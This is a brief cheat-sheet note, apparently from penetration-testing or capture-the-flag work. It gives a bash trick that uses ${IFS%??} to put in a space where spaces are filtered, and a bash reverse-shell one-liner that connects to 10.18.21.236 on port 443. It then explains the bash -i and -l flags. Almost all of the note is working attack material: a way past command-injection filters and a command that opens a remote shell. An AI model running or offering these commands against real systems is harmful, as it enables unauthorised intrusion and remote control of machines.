`${IFS%??}` = space as in `which${IFS%??}bash`

^works on bash, not on zsh

`/bin/bash -i >& /dev/tcp/10.18.21.236/443 0>&1`


-i   interactive
-l   executes `~/.bash_profile`, `~/.bash_login`, or `~/.profile` (in that order) and inherits environment variables set in those files

